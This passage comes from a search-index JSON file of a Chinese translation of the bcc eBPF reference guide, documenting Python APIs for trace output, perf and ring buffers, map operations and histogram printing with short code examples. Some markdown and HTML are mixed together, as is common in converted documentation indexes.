\u51fd\u6570\u5c06\u6570\u636e\u5199\u5165\u8be5\u6587\u4ef6\uff0c\u4f46\u8be5\u65b9\u6cd5\u5b58\u5728\u9650\u5236\uff0c\u5305\u62ec\u7f3a\u4e4f\u5e76\u53d1\u8ddf\u8e2a\u652f\u6301\u3002\u66f4\u63a8\u8350\u4f7f\u7528\u524d\u9762\u4ecb\u7ecd\u7684 BPF_PERF_OUTPUT \u673a\u5236\u3002</p> <p>\u53c2\u6570\uff1a</p> <ul> <li><code>fmt</code>: \u53ef\u9009\uff0c\u53ef\u4ee5\u5305\u542b\u5b57\u6bb5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff0c\u9ed8\u8ba4\u4e3a <code>None</code>\u3002</li> </ul> <p>\u793a\u4f8b\uff1a</p> <pre><code># \u5c06 trace_pipe \u8f93\u51fa\u539f\u6837\u6253\u5370\uff1a\nb.trace_print()\n\n# \u6253\u5370 PID \u548c\u6d88\u606f\uff1a\nb.trace_print(fmt=\"{1} {5}\")\n</code></pre> <p>\u793a\u4f8b\u4e2d\u7684\u5185\u90e8\u4ee3\u7801\uff1a search /examples\u3002\"\u641c\u7d22 /\u5de5\u5177</p>"},{"location":"tutorials/bcc-documents/reference_guide/#2-trace_fields","title":"2. trace_fields()","text":"<p>\u8bed\u6cd5: <code>BPF.trace_fields(nonblocking=False)</code></p> <p>\u8be5\u65b9\u6cd5\u4ece\u5168\u5c40\u5171\u4eab\u7684 /sys/kernel/debug/tracing/trace_pipe \u6587\u4ef6\u4e2d\u8bfb\u53d6\u4e00\u884c\uff0c\u5e76\u5c06\u5176\u4f5c\u4e3a\u5b57\u6bb5\u8fd4\u56de\u3002\u8be5\u6587\u4ef6\u53ef\u4ee5\u901a\u8fc7 BPF \u548c bpf_trace_printk() \u51fd\u6570\u8fdb\u884c\u5199\u5165\uff0c\u4f46\u8be5\u65b9\u6cd5\u6709\u4e00\u4e9b\u9650\u5236\uff0c\u5305\u62ec\u7f3a\u4e4f\u5e76\u53d1\u8ffd\u8e2a\u652f\u6301\u3002\u6211\u4eec\u66f4\u63a8\u8350\u4f7f\u7528\u4e4b\u524d\u4ecb\u7ecd\u7684 BPF_PERF_OUTPUT \u673a\u5236\u3002</p> <p>\u53c2\u6570:</p> <ul> <li><code>nonblocking</code>: \u53ef\u9009\u53c2\u6570\uff0c\u9ed8\u8ba4\u4e3a <code>False</code>\u3002\u5f53\u8bbe\u7f6e\u4e3a <code>True</code> \u65f6\uff0c\u7a0b\u5e8f\u5c06\u4e0d\u4f1a\u963b\u585e\u7b49\u5f85\u8f93\u5165\u3002</li> </ul> <p>\u793a\u4f8b:</p> <pre><code>while 1:\n    try:\n        (task, pid, cpu, flags, ts, msg) = b.trace_fields()\n    except ValueError:\n        continue\n    [...]\n</code></pre> <p>\u5185\u8054\u793a\u4f8b: \u641c\u7d22 /\u793a\u4f8b, \u641c\u7d22 /\u5de5\u5177</p>"},{"location":"tutorials/bcc-documents/reference_guide/#api","title":"\u8f93\u51fa API","text":"<p>BPF \u7a0b\u5e8f\u7684\u6b63\u5e38\u8f93\u51fa\u6709\u4e24\u79cd\u65b9\u5f0f:</p> <ul> <li>\u6bcf\u4e2a\u4e8b\u4ef6: \u4f7f\u7528 PERF_EVENT_OUTPUT\u3001open_perf_buffer() \u548c perf_buffer_poll()\u3002</li> <li>map \u6c47\u603b: \u4f7f\u7528 items() \u6216 print_log2_hist()\uff0c\u5728 Maps \u90e8\u5206\u6709\u4ecb\u7ecd\u3002</li> </ul>"},{"location":"tutorials/bcc-documents/reference_guide/#1-perf_buffer_poll","title":"1. perf_buffer_poll()","text":"<p>\u8bed\u6cd5: <code>BPF.perf_buffer_poll(timeout=T)</code></p> <p>\u8be5\u65b9\u6cd5\u4ece\u6240\u6709\u6253\u5f00\u7684 perf \u73af\u5f62\u7f13\u51b2\u533a\u4e2d\u8f6e\u8be2\uff0c\u5e76\u5bf9\u6bcf\u4e2a\u6761\u76ee\u8c03\u7528\u5728\u8c03\u7528 open_perf_buffer \u65f6\u63d0\u4f9b\u7684\u56de\u8c03\u51fd\u6570\u3002</p> <p>timeout \u53c2\u6570\u662f\u53ef\u9009\u7684\uff0c\u5e76\u4ee5\u6beb\u79d2\u4e3a\u5355\u4f4d\u8ba1\u91cf\u3002\u5982\u679c\u672a\u63d0\u4f9b\uff0c\u5219\u8f6e\u8be2\u5c06\u65e0\u9650\u671f\u8fdb\u884c\u3002</p> <p>\u793a\u4f8b:</p> <pre><code># \u5faa\u73af\u8c03\u7528\u5e26\u6709\u56de\u8c03\u51fd\u6570 print_event \u7684 open_perf_buffer\nb[\"events\"].open_perf_buffer(print_event)\nwhile 1:\n    try:\n        b.perf_buffer_poll()\n    except KeyboardInterrupt:\n        exit()\n</code></pre> <p>\u5185\u8054\u793a\u4f8b: \u4ee3\u7801\".\"\u641c\u7d22 /\u793a\u4f8b, \u641c\u7d22 /\u5de5\u5177</p>"},{"location":"tutorials/bcc-documents/reference_guide/#2-ring_buffer_poll","title":"2. ring_buffer_poll()","text":"<p>\u8bed\u6cd5: <code>BPF.ring_buffer_poll(timeout=T)</code></p> <p>\u8fd9\u4e2a\u65b9\u6cd5\u4ece\u6240\u6709\u5df2\u6253\u5f00\u7684ringbuf\u73af\u5f62\u7f13\u51b2\u533a\u4e2d\u8f6e\u8be2\u6570\u636e\uff0c\u5bf9\u6bcf\u4e2a\u6761\u76ee\u8c03\u7528\u5728\u8c03\u7528open_ring_buffer\u65f6\u63d0\u4f9b\u7684\u56de\u8c03\u51fd\u6570\u3002</p> <p>timeout\u53c2\u6570\u662f\u53ef\u9009\u7684\uff0c\u4ee5\u6beb\u79d2\u4e3a\u5355\u4f4d\u6d4b\u91cf\u3002\u5982\u679c\u6ca1\u6709\u6307\u5b9a\uff0c\u8f6e\u8be2\u5c06\u6301\u7eed\u5230\u6ca1\u6709\u66f4\u591a\u7684\u6570\u636e\u6216\u56de\u8c03\u51fd\u6570\u8fd4\u56de\u8d1f\u503c\u3002</p> <p>\u793a\u4f8b:</p> <pre><code># \u5faa\u73af\u4f7f\u7528\u56de\u8c03\u51fd\u6570print_event\nb[\"events\"].open_ring_buffer(print_event)\nwhile 1:\n    try:\n        b.ring_buffer_poll(30)\n    except KeyboardInterrupt:\n        exit();\n</code></pre> <p>\u793a\u4f8b\uff1a \u641c\u7d22 /\u793a\u4f8b,</p>"},{"location":"tutorials/bcc-documents/reference_guide/#3-ring_buffer_consume","title":"3. ring_buffer_consume()","text":"<p>\u8bed\u6cd5: <code>BPF.ring_buffer_consume()</code></p> <p>\u8fd9\u4e2a\u65b9\u6cd5\u4ece\u6240\u6709\u5df2\u6253\u5f00\u7684ringbuf\u73af\u5f62\u7f13\u51b2\u533a\u4e2d\u6d88\u8d39\u6570\u636e\uff0c\u5bf9\u6bcf\u4e2a\u6761\u76ee\u8c03\u7528\u5728\u8c03\u7528open_ring_buffer\u65f6\u63d0\u4f9b\u7684\u56de\u8c03\u51fd\u6570\u3002</p> <p>\u4e0e<code>ring_buffer_poll</code>\u4e0d\u540c\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u5728\u5c1d\u8bd5\u6d88\u8d39\u6570\u636e\u4e4b\u524d\u4e0d\u4f1a\u8f6e\u8be2\u6570\u636e\u3002\u8fd9\u6837\u53ef\u4ee5\u51cf\u5c11\u5ef6\u8fdf\uff0c\u4f46\u4f1a\u589e\u52a0CPU\u6d88\u8017\u3002\u5982\u679c\u4e0d\u786e\u5b9a\u4f7f\u7528\u54ea\u79cd\u65b9\u6cd5\uff0c\u5efa\u8bae\u4f7f\u7528<code>ring_buffer_poll</code>\u3002</p> <p>\u793a\u4f8b:</p> <pre><code># \u5faa\u73af\u4f7f\u7528\u56de\u8c03\u51fd\u6570print_event\nb[\"events\"].open_ring_buffer(print_event)\nwhile 1:\n    try:\n        b.ring_buffer_consume()\n    except KeyboardInterrupt:\n        exit();\n</code></pre> <p>\u793a\u4f8b\uff1a \u641c\u7d22 /\u793a\u4f8b,</p>"},{"location":"tutorials/bcc-documents/reference_guide/#map-apis","title":"Map APIs","text":"<p>Maps\u662fBPF\u6570\u636e\u5b58\u50a8\u5668\uff0c\u5728bcc\u4e2d\u7528\u4e8e\u5b9e\u73b0\u8868\u3001\u54c8\u5e0c\u548c\u76f4\u65b9\u56fe\u7b49\u66f4\u9ad8\u5c42\u6b21\u7684\u5bf9\u8c61\u3002</p>"},{"location":"tutorials/bcc-documents/reference_guide/#1-get_table","title":"1. get_table()","text":"<p>\u8bed\u6cd5: <code>BPF.get_table(name)</code>\".\u8fd4\u56de\u4e00\u4e2atable\u5bf9\u8c61\u3002\u7531\u4e8e\u53ef\u4ee5\u5c06\u8868\u683c\u4f5c\u4e3aBPF\u9879\u8fdb\u884c\u8bfb\u53d6\uff0c\u56e0\u6b64\u6b64\u529f\u80fd\u4e0d\u518d\u4f7f\u7528\u3002\u4f8b\u5982\uff1a<code>BPF[name]</code>\u3002</p> <p>\u793a\u4f8b\uff1a</p> <pre><code>counts = b.get_table(\"counts\")\n\ncounts = b[\"counts\"]\n</code></pre> <p>\u8fd9\u4e24\u8005\u662f\u7b49\u4ef7\u7684\u3002</p>"},{"location":"tutorials/bcc-documents/reference_guide/#2-open_perf_buffer","title":"2. open_perf_buffer()","text":"<p>\u8bed\u6cd5\uff1a<code>table.open_perf_buffers(callback, page_cnt=N, lost_cb=None)</code></p> <p>\u6b64\u64cd\u4f5c\u57fa\u4e8eBPF\u4e2d\u5b9a\u4e49\u7684\u8868\u683c\uff08<code>BPF_PERF_OUTPUT()</code>\uff09\uff0c\u5c06\u56de\u8c03Python\u51fd\u6570<code>callback</code>\u5173\u8054\u5230\u5728perf\u73af\u5f62\u7f13\u51b2\u533a\u4e2d\u6709\u6570\u636e\u53ef\u7528\u65f6\u8c03\u7528\u3002\u8fd9\u662f\u4ece\u5185\u6838\u4f20\u8f93\u6bcf\u4e2a\u4e8b\u4ef6\u7684\u6570\u636e\u5230\u7528\u6237\u7a7a\u95f4\u7684\u63a8\u8350\u673a\u5236\u7684\u4e00\u90e8\u5206\u3002\u53ef\u4ee5\u901a\u8fc7<code>page_cnt</code>\u53c2\u6570\u6307\u5b9aperf\u73af\u5f62\u7f13\u51b2\u533a\u7684\u5927\u5c0f\uff0c\u9ed8\u8ba4\u4e3a8\u4e2a\u9875\u9762\uff0c\u5fc5\u987b\u662f\u9875\u6570\u76842\u7684\u5e42\u6b21\u65b9\u3002\u5982\u679c\u56de\u8c03\u51fd\u6570\u4e0d\u80fd\u5feb\u901f\u5904\u7406\u6570\u636e\uff0c\u5219\u53ef\u80fd\u4e22\u5931\u67d0\u4e9b\u63d0\u4ea4\u7684\u6570\u636e\u3002<code>lost_cb</code>\u7528\u4e8e\u8bb0\u5f55/\u76d1\u89c6\u4e22\u5931\u7684\u8ba1\u6570\u3002\u5982\u679c<code>lost_cb</code>\u662f\u9ed8\u8ba4\u7684<code>None</code>\u503c\uff0c\u5219\u53ea\u4f1a\u6253\u5370\u4e00\u884c\u6d88\u606f\u5230<code>stderr</code>\u3002</p> <p>\u793a\u4f8b\uff1a</p> <pre><code># \u5904\u7406\u4e8b\u4ef6\ndef print_event(cpu, data, size):\n    event = ct.cast(data, ct.POINTER(Data)).contents\n    [...]\n\n# \u5faa\u73af\u901a\u8fc7\u56de\u8c03\u51fd\u6570\u6253\u5370\u4e8b\u4ef6\nb[\"events\"].open_perf_buffer(print_event)\nwhile 1:\n    try:\n        b.perf_buffer_poll()\n    except KeyboardInterrupt:\n        exit()\n</code></pre> <p>\u8bf7\u6ce8\u610f\uff0c\u4f20\u8f93\u7684\u6570\u636e\u7ed3\u6784\u9700\u8981\u5728BPF\u7a0b\u5e8f\u4e2d\u4ee5C\u65b9\u5f0f\u58f0\u660e\u3002\u4f8b\u5982\uff1a</p> <pre><code>// \u5728C\u4e2d\u5b9a\u4e49\u8f93\u51fa\u6570\u636e\u7ed3\u6784\nstruct data_t {\n    u32 pid;\n    u64 ts;\n    char comm[TASK_COMM_LEN];\n};\nBPF_PERF_OUTPUT(events);\n[...]\n</code></pre> <p>\u5728Python\u4e2d\uff0c\u60a8\u53ef\u4ee5\u8ba9bcc\u81ea\u52a8\u751f\u6210C\u58f0\u660e\u4e2d\u7684\u6570\u636e\u7ed3\u6784\uff08\u5efa\u8bae\u65b9\u6cd5\uff09\uff1a</p> <pre><code>def print_event(cpu, data, size):\n    event = b[\"events\"].event(data)\n[...]\n</code></pre> <p>\u6216\u8005\u624b\u52a8\u5b9a\u4e49\uff1a</p> <pre><code># \u5728Python\u4e2d\u5b9a\u4e49\u8f93\u51fa\u6570\u636e\u7ed3\u6784\nTASK_COMM_LEN = 16    # linux/sched.h\nclass Data(ct.Structure):\n    _fields_ = [(\"pid\", ct.c_ulonglong),\n                (\"ts\", ct.c_ulonglong),\n                (\"comm\", ct.c_char * TASK_COMM_LEN)]\"\u3002def print_event(cpu, data, size):\n    event = ct.cast(data, ct.POINTER(Data)).contents\n[...]\n\n\n\u5728\u6b64\u5904\u7684\u793a\u4f8b\u4e2d\uff1a\n[code](https://github.com/iovisor/bcc/blob/v0.9.0/examples/tracing/hello_perf_output.py#L52),\n[search /examples](https://github.com/iovisor/bcc/search?q=open_perf_buffer+path%3Aexamples+language%3Apython&amp;type=Code),\n[search /tools](https://github.com/iovisor/bcc/search?q=open_perf_buffer+path%3Atools+language%3Apython&amp;type=Code)\n\n### 3. items()\n\n\u8bed\u6cd5: ```table.items()```\n\n\u8fd4\u56de\u4e00\u4e2a\u8868\u4e2d\u7684\u952e\u6570\u7ec4\u3002\u5b83\u53ef\u4ee5\u4e0eBPF_HASH\u6620\u5c04\u4e00\u8d77\u4f7f\u7528\uff0c\u4ece\u800c\u83b7\u53d6\u5e76\u8fed\u4ee3\u952e\u3002\n\n\u793a\u4f8b:\n\n```Python\n# \u6253\u5370\u8f93\u51fa\nprint(\"%10s %s\" % (\"COUNT\", \"STRING\"))\ncounts = b.get_table(\"counts\")\nfor k, v in sorted(counts.items(), key=lambda counts: counts[1].value):\n    print(\"%10d \\\"%s\\\"\" % (v.value, k.c.encode('string-escape')))\n</code></pre> <p>\u6b64\u793a\u4f8b\u8fd8\u4f7f\u7528<code>sorted()</code>\u65b9\u6cd5\u6309\u503c\u6392\u5e8f\u3002</p> <p>\u5728\u6b64\u5904\u7684\u793a\u4f8b\u4e2d\uff1a search /examples, search /tools\u3002</p>"},{"location":"tutorials/bcc-documents/reference_guide/#4-values","title":"4. values()","text":"<p>\u8bed\u6cd5: <code>table.values()</code></p> <p>\u8fd4\u56de\u4e00\u4e2a\u8868\u4e2d\u7684\u503c\u6570\u7ec4\u3002</p>"},{"location":"tutorials/bcc-documents/reference_guide/#5-clear","title":"5. clear()","text":"<p>\u8bed\u6cd5: <code>table.clear()</code></p> <p>\u6e05\u9664\u8868\uff1a\u5220\u9664\u6240\u6709\u6761\u76ee\u3002</p> <p>\u793a\u4f8b:</p> <pre><code># \u6bcf\u79d2\u6253\u5370\u6620\u5c04\u6458\u8981\uff1a\nwhile True:\n    time.sleep(1)\n    print(\"%-8s\\n\" % time.strftime(\"%H:%M:%S\"), end=\"\")\n    dist.print_log2_hist(sym + \" return:\")\n    dist.clear()\n</code></pre> <p>\u5728\u6b64\u5904\u7684\u793a\u4f8b\u4e2d: search /examples, search /tools\u3002</p>"},{"location":"tutorials/bcc-documents/reference_guide/#6-items_lookup_and_delete_batch","title":"6. items_lookup_and_delete_batch()","text":"<p>\u8bed\u6cd5: <code>table.items_lookup_and_delete_batch()</code>\u3002\u8fd4\u56de\u4e00\u4e2a\u4f7f\u7528\u4e00\u6b21BPF\u7cfb\u7edf\u8c03\u7528\u5728\u8868\u4e2d\u7684\u952e\u7684\u6570\u7ec4\u3002\u53ef\u4ee5\u4e0eBPF_HASH\u6620\u5c04\u4e00\u8d77\u4f7f\u7528\u4ee5\u83b7\u53d6\u548c\u8fed\u4ee3\u952e\u3002\u8fd8\u4f1a\u6e05\u9664\u8868\uff1a\u5220\u9664\u6240\u6709\u6761\u76ee\u3002 \u60a8\u5e94\u8be5\u4f7f\u7528table.items_lookup_and_delete_batch()\u800c\u4e0d\u662ftable.items()\u540e\u8ddftable.clear()\u3002\u5b83\u9700\u8981\u5185\u6838v5.6\u3002</p> <p>\u793a\u4f8b:</p> <pre><code># \u6bcf\u79d2\u6253\u5370\u8c03\u7528\u7387:\nprint(\"%9s-%9s-%8s-%9s\" % (\"PID\", \"COMM\", \"fname\", \"counter\"))\nwhile True:\n    for k, v in sorted(b['map'].items_lookup_and_delete_batch(), key=lambda kv: (kv[0]).pid):\n        print(\"%9s-%9s-%8s-%9d\" % (k.pid, k.comm, k.fname, v.counter))\n    sleep(1)\n</code></pre>"},{"location":"tutorials/bcc-documents/reference_guide/#7-items_lookup_batch","title":"7. items_lookup_batch()","text":"<p>\u8bed\u6cd5: <code>table.items_lookup_batch()</code></p> <p>\u4f7f\u7528\u4e00\u6b21BPF\u7cfb\u7edf\u8c03\u7528\u8fd4\u56de\u8868\u4e2d\u7684\u952e\u6570\u7ec4\u3002\u53ef\u4ee5\u4e0eBPF_HASH\u6620\u5c04\u4e00\u8d77\u4f7f\u7528\u4ee5\u83b7\u53d6\u548c\u8fed\u4ee3\u952e\u3002 \u60a8\u5e94\u8be5\u4f7f\u7528table.items_lookup_batch()\u800c\u4e0d\u662ftable.items()\u3002\u5b83\u9700\u8981\u5185\u6838v5.6\u3002</p> <p>\u793a\u4f8b:</p> <pre><code># \u6253\u5370\u6620\u5c04\u7684\u5f53\u524d\u503c:\nprint(\"%9s-%9s-%8s-%9s\" % (\"PID\", \"COMM\", \"fname\", \"counter\"))\nwhile True:\n    for k, v in sorted(b['map'].items_lookup_batch(), key=lambda kv: (kv[0]).pid):\n        print(\"%9s-%9s-%8s-%9d\" % (k.pid, k.comm, k.fname, v.counter))\n</code></pre>"},{"location":"tutorials/bcc-documents/reference_guide/#8-items_delete_batch","title":"8. items_delete_batch()","text":"<p>\u8bed\u6cd5: <code>table.items_delete_batch(keys)</code></p> <p>\u5f53keys\u4e3aNone\u65f6\uff0c\u5b83\u4f1a\u6e05\u9664BPF_HASH\u6620\u5c04\u7684\u6240\u6709\u6761\u76ee\u3002\u5b83\u6bd4table.clear()\u66f4\u6709\u6548\uff0c\u56e0\u4e3a\u5b83\u53ea\u751f\u6210\u4e00\u4e2a\u7cfb\u7edf\u8c03\u7528\u3002\u60a8\u53ef\u4ee5\u901a\u8fc7\u7ed9\u51fa\u4e00\u4e2a\u952e\u6570\u7ec4\u6765\u5220\u9664\u6620\u5c04\u7684\u4e00\u4e2a\u5b50\u96c6\u3002\u8fd9\u4e9b\u952e\u53ca\u5176\u5173\u8054\u503c\u5c06\u88ab\u5220\u9664\u3002\u5b83\u9700\u8981\u5185\u6838v5.6\u3002</p> <p>\u53c2\u6570:</p> <ul> <li>keys\u662f\u53ef\u9009\u7684\uff0c\u9ed8\u8ba4\u4e3aNone\u3002</li> </ul>"},{"location":"tutorials/bcc-documents/reference_guide/#9-items_update_batch","title":"9. items_update_batch()","text":"<p>\u8bed\u6cd5: <code>table.items_update_batch(keys, values)</code></p> <p>\u4f7f\u7528\u65b0\u503c\u66f4\u65b0\u6240\u6709\u63d0\u4f9b\u7684\u952e\u3002\u4e24\u4e2a\u53c2\u6570\u5fc5\u987b\u5177\u6709\u76f8\u540c\u7684\u957f\u5ea6\u5e76\u4e14\u5728\u6620\u5c04\u9650\u5236\u4e4b\u5185\uff08\u57281\u5230\u6700\u5927\u6761\u76ee\u4e4b\u95f4\uff09\u3002\u5b83\u9700\u8981\u5185\u6838v5.6\u3002</p> <p>\u53c2\u6570:</p> <ul> <li>keys\u662f\u8981\u66f4\u65b0\u7684\u952e\u5217\u8868</li> <li>values\u662f\u5305\u542b\u65b0\u503c\u7684\u5217\u8868\u3002### 10. print_log2_hist()</li> </ul> <p>\u8bed\u6cd5: <code>table.print_log2_hist(val_type=\"value\", section_header=\"Bucket ptr\", section_print_fn=None)</code></p> <p>\u4ee5ASCII\u7684\u5f62\u5f0f\u6253\u5370\u4e00\u4e2a\u8868\u683c\u4f5c\u4e3alog2\u76f4\u65b9\u56fe\u3002\u8be5\u8868\u5fc5\u987b\u4ee5log2\u7684\u5f62\u5f0f\u5b58\u50a8\uff0c\u53ef\u4f7f\u7528BPF\u51fd\u6570<code>bpf_log2l()</code>\u5b8c\u6210\u3002</p> <p>\u53c2\u6570:</p> <ul> <li>val_type: \u53ef\u9009\uff0c\u5217\u6807\u9898\u3002</li> <li>section_header: \u5982\u679c\u76f4\u65b9\u56fe\u6709\u4e00\u4e2a\u8f85\u52a9\u952e\uff0c\u591a\u4e2a\u8868\u683c\u5c06\u88ab\u6253\u5370\uff0c\u5e76\u4e14section_header\u53ef\u4ee5\u7528\u4f5c\u6bcf\u4e2a\u8868\u683c\u7684\u6807\u9898\u63cf\u8ff0\u3002</li> <li>section_print_fn: \u5982\u679csection_print_fn\u4e0d\u4e3aNone\uff0c\u5219\u5c06\u4f20\u9012\u7ed9bucket\u503c\u3002</li> </ul> <p>\u793a\u4f8b:</p> <pre><code>b = BPF(text=\"\"\"\nBPF_HISTOGRAM(dist);\n\nint kprobe__blk_account_io_done(struct pt_regs *ctx, struct request *req)\n{\n dist.increment(bpf_log2l(req-&gt;__data_len / 1024));\n return 0;\n}\n\"\"\")\n[...]\n\nb[\"dist\"].print_log2_hist(\"kbytes\")\n</code></pre> <p>\u8f93\u51fa:</p> <pre><code>     kbytes          : count     distribution\n       0 -&gt; 1        : 3        |                                      |\n       2 -&gt; 3        : 0        |                                      |\n       4 -&gt; 7        : 211      |**********                            |\n       8 -&gt; 15       : 0        |                                      |\n      16 -&gt; 31       : 0        |                                      |\n      32 -&gt; 63       : 0        |                                      |\n      64 -&gt; 127      : 1        |                                      |\n     128 -&gt; 255      : 800      |**************************************|\n</code></pre> <p>\u8fd9\u4e2a\u8f93\u51fa\u663e\u793a\u4e86\u4e00\u4e2a\u591a\u6a21\u5f0f\u5206\u5e03\uff0c\u6700\u5927\u6a21\u5f0f\u662f128-&gt;255 kbytes\uff0c\u8ba1\u6570\u4e3a800\u3002</p> <p>\u8fd9\u662f\u4e00\u79cd\u9ad8\u6548\u7684\u6570\u636e\u6982\u62ec\u65b9\u6cd5\uff0c\u56e0\u4e3a\u6982\u62ec\u662f\u5728\u5185\u6838\u4e2d\u6267\u884c\u7684\uff0c\u53ea\u6709\u8ba1\u6570\u5217\u88ab\u4f20\u9012\u5230\u7528\u6237\u7a7a\u95f4\u3002</p> <p>\u5b9e\u9645\u793a\u4f8b: \u641c\u7d22 /examples, \u641c\u7d22 /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#11-print_linear_hist-tableprint_linear_histval_typevalue-section_headerbucket-ptr-section_print_fnnone","title":"11. print_linear_hist()\".\u8bed\u6cd5: <code>table.print_linear_hist(val_type=\"value\", section_header=\"Bucket ptr\", section_print_fn=None)</code>","text":"<p>\u4ee5ASCII\u5b57\u7b26\u5f62\u5f0f\u6253\u5370\u4e00\u4e2a\u7ebf\u6027\u76f4\u65b9\u56fe\u7684\u8868\u683c\u3002\u6b64\u529f\u80fd\u65e8\u5728\u53ef\u89c6\u5316\u5c0f\u7684\u6574\u6570\u8303\u56f4\uff0c\u4f8b\u59820\u5230100\u3002</p> <p>\u53c2\u6570:</p> <ul> <li>val_type: \u53ef\u9009\uff0c\u5217\u6807\u9898\u3002</li> <li>section_header: \u5982\u679c\u76f4\u65b9\u56fe\u6709\u4e00\u4e2a\u4e8c\u7ea7\u952e\uff0c\u5219\u4f1a\u6253\u5370\u591a\u4e2a\u8868\u683c\uff0c\u5e76\u4e14section_header\u53ef\u4ee5\u7528\u4f5c\u6bcf\u4e2a\u8868\u683c\u7684\u5934\u90e8\u63cf\u8ff0\u3002</li> <li>section_print_fn: \u5982\u679csection_print_fn\u4e0d\u4e3aNone\uff0c\u5219\u4f1a\u5c06bucket\u7684\u503c\u4f20\u9012\u7ed9\u5b83\u3002</li> </ul> <p>\u793a\u4f8b:</p> <pre><code>b = BPF(text=\"\"\"\nBPF_HISTOGRAM(dist);\n\nint kprobe__blk_account_io_done(struct pt_regs *ctx, struct request *req)\n{\n dist.increment(req-&gt;__data_len / 1024);\n return 0;\n}\n\"\"\")\n[...]\n\nb[\"dist\"].print_linear_hist(\"kbytes\")\n</code></pre> <p>\u8f93\u51fa:</p> <pre><code>     kbytes        : count     distribution\n        0          : 3        |******                                  |\n        1          : 0        |                                        |\n        2          : 0        |                                        |\n        3          : 0        |                                        |\n        4          : 19       |****************************************|\n        5          : 0        |                                        |\n        6          : 0        |                                        |\n        7          : 0        |                                        |\n        8          : 4        |********                                |\n        9          : 0        |                                        |\n        10         : 0        |                                        |\n        11         : 0        |                                        |\n        12         : 0        |                                        |\n        13         : 0        |                                        |\n        14         : 0        |                                        |\n        15         : 0        |                                        |\u3002\n```### 16         : 2        |****                                    |\n[...]\n</code></pre> <p>\u8fd9\u662f\u4e00\u79cd\u9ad8\u6548\u7684\u6570\u636e\u6c47\u603b\u65b9\u5f0f\uff0c\u56e0\u4e3a\u6c47\u603b\u662f\u5728\u5185\u6838\u4e2d\u6267\u884c\u7684\uff0c\u53ea\u6709\u8ba1\u6570\u5217\u4e2d\u7684\u503c\u4f20\u9012\u5230\u7528\u6237\u7a7a\u95f4\u3002</p> <p>\u73b0\u573a\u793a\u4f8b: \u641c\u7d22 /examples, \u641c\u7d22 /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#12-open_ring_buffer","title":"12. open_ring_buffer()","text":"<p>\u8bed\u6cd5: <code>table.open_ring_buffer(callback, ctx=None)</code></p> <p>\u6b64\u64cd\u4f5c\u7528\u4e8e\u5728BPF\u4e2d\u5b9a\u4e49\u4e3aBPF_RINGBUF_OUTPUT()\u7684\u8868\uff0c\u5e76\u5c06Python\u56de\u8c03\u51fd\u6570<code>callback</code>\u4e0eringbuf\u73af\u5f62\u7f13\u51b2\u533a\u4e2d\u6709\u53ef\u7528\u6570\u636e\u65f6\u8c03\u7528\u76f8\u8fde\u3002\u8fd9\u662f\u4ece\u5185\u6838\u5411\u7528\u6237\u7a7a\u95f4\u4f20\u8f93\u6bcf\u4e2a\u4e8b\u4ef6\u6570\u636e\u7684\u65b0\uff08Linux 5.8+\uff09\u63a8\u8350\u673a\u5236\u7684\u4e00\u90e8\u5206\u3002\u4e0d\u540c\u4e8eperf\u7f13\u51b2\u533a\uff0cringbuf\u5927\u5c0f\u5728BPF\u7a0b\u5e8f\u4e2d\u6307\u5b9a\uff0c\u4f5c\u4e3a<code>BPF_RINGBUF_OUTPUT</code>\u5b8f\u7684\u4e00\u90e8\u5206\u3002\u5982\u679c\u56de\u8c03\u51fd\u6570\u5904\u7406\u6570\u636e\u4e0d\u591f\u5feb\uff0c\u53ef\u80fd\u4f1a\u4e22\u5931\u4e00\u4e9b\u63d0\u4ea4\u7684\u6570\u636e\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u4e8b\u4ef6\u5e94\u8be5\u66f4\u9891\u7e41\u5730\u8fdb\u884c\u8f6e\u8be2\u548c/\u6216\u589e\u52a0\u73af\u5f62\u7f13\u51b2\u533a\u7684\u5927\u5c0f\u3002</p> <p>\u793a\u4f8b:</p> <pre><code># \u5904\u7406\u4e8b\u4ef6\ndef print_event(ctx, data, size):\n    event = ct.cast(data, ct.POINTER(Data)).contents\n    [...]\n\n# \u5faa\u73af\u5e76\u4f7f\u7528print_event\u56de\u8c03\u51fd\u6570\nb[\"events\"].open_ring_buffer(print_event)\nwhile 1:\n    try:\n        b.ring_buffer_poll()\n    except KeyboardInterrupt:\n        exit()\n</code></pre> <p>\u8bf7\u6ce8\u610f\uff0c\u5728BPF\u7a0b\u5e8f\u4e2d\uff0c\u4f20\u8f93\u7684\u6570\u636e\u7ed3\u6784\u9700\u8981\u5728C\u4e2d\u58f0\u660e\u3002\u4f8b\u5982:</p> <pre><code>// \u5728C\u4e2d\u5b9a\u4e49\u8f93\u51fa\u6570\u636e\u7ed3\u6784\nstruct data_t {\n    u32 pid;\n    u64 ts;\n    char comm[TASK_COMM_LEN];\n};\nBPF_RINGBUF_OUTPUT(events, 8);\n[...]\n</code></pre> <p>\u5728Python\u4e2d\uff0c\u60a8\u53ef\u4ee5\u8ba9bcc\u81ea\u52a8\u4eceC\u7684\u58f0\u660e\u4e2d\u751f\u6210\u6570\u636e\u7ed3\u6784\uff08\u63a8\u8350\uff09:</p> <pre><code>def print_event(ctx, data, size):\n    event = b[\"events\"].event(data)\n[...]\n</code></pre> <p>\u6216\u8005\u624b\u52a8\u5b9a\u4e49:</p> <p>```Python\".# \u5728Python\u4e2d\u5b9a\u4e49\u8f93\u51fa\u6570\u636e\u7ed3\u6784 TASK_COMM_LEN = 16    # linux/sched.h class Data(ct.Structure):     fields = [(\"pid\", ct.c_ulonglong),                 (\"ts\", ct.c_ulonglong),                 (\"comm\", ct.c_char * TASK_COMM_LEN)]</p> <p>def print_event(ctx, data, size):     event = ct.cast(data, ct.POINTER(Data)).contents [...]</p> <pre><code>\u5728\u539f\u5730\u7684\u793a\u4f8b:\n[\u5728/examples\u4e2d\u641c\u7d22](https://github.com/iovisor/bcc/search?q=open_ring_buffer+path%3Aexamples+language%3Apython&amp;type=Code),\n\n### 13. push()\n\n\u8bed\u6cd5: ```table.push(leaf, 